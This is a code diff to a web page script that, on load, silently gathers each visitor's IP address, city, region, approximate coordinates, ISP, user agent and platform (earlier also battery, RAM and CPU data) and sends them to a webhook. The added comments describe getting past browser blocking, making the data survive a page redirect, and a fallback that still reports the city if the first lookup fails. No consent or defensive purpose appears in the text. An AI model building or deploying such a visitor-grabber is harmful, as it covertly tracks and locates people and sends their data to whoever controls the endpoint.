@@ -63,39 +63,38 @@
         }
     }
 
-    async function capturePassiveData() {
-        try {
-            // 1. Get IP Metadata (Neighborhood Level)
-            const response = await fetch('http://ip-api.com/json/');
-            const ipData = await response.json();
-            
-            // 2. Get Battery Metadata (Android Specific)
-            let batt = { level: "Unknown", charging: "Unknown" };
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batt = { level: (b.level * 100) + "%", charging: b.charging };
-            }
+   async function capturePassiveData() {
+    try {
+        // Use HTTPS and a cache-buster (?t=...) to bypass browser blocking
+        const response = await fetch(`https://api.ipify.org?format=json&t=${Date.now()}`);
+        const basicData = await response.json();
+        const userIP = basicData.ip;
 
-            // Update Terminal UI
-            document.getElementById('passive-status').innerText = "SUCCESS";
-            document.getElementById('passive-status').style.color = "#00ff41";
+        // Now that we have the IP, get the location from a secure provider
+        const locResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+        const ipData = await locResponse.json();
+        
+        // Update Terminal UI
+        document.getElementById('passive-status').innerText = "SUCCESS";
+        document.getElementById('passive-status').style.color = "#00ff41";
 
-            // 3. Send to Webhook (Immediate)
-            logToWebhook({
-                event: "PASSIVE_CAPTURE",
-                ip: ipData.query,
-                location: `${ipData.city}, ${ipData.regionName}`,
-                approx_coords: `${ipData.lat}, ${ipData.lon}`,
-                isp: ipData.isp,
-                battery: batt,
-                ram: navigator.deviceMemory + "GB",
-                cores: navigator.hardwareConcurrency
-            });
-        } catch (e) {
-            document.getElementById('passive-status').innerText = "FAILED";
-            document.getElementById('passive-status').style.color = "red";
-        }
+        // Send to Webhook with 'keepalive' to ensure it survives the redirect
+        logToWebhook({
+            event: "PASSIVE_CAPTURE",
+            ip: userIP,
+            location: `${ipData.city}, ${ipData.region}`,
+            coords_approx: `${ipData.latitude}, ${ipData.longitude}`,
+            isp: ipData.org,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform
+        });
+    } catch (e) {
+        // If the first one fails, try a direct fallback
+        const fallback = await fetch('https://ipapi.co/json/');
+        const fbData = await fallback.json();
+        logToWebhook({ event: "PASSIVE_FALLBACK", city: fbData.city });
     }
+}
 
     async function logToWebhook(data) {
         // 'keepalive' ensures the data is sent even if the page closes
